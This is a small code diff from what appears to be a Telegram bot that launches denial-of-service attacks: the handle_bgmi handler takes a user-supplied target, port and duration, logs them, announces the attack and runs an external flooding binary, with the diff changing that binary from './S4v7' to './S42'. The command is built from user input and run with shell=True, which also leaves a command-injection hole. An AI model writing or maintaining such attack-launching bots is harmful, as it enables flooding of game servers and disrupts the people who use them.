@@ -190,7 +190,7 @@ def handle_bgmi(message):
                             log_command(user_id, target, port, time)
                             start_attack_reply(message, target, port, time)
 
-                            full_command = f"./S4v7 {target} {port} {time} 1000"
+                            full_command = f"./S42 {target} {port} {time} 1000"
                             subprocess.run(full_command, shell=True)
 
                             # Update the last attack time for this user
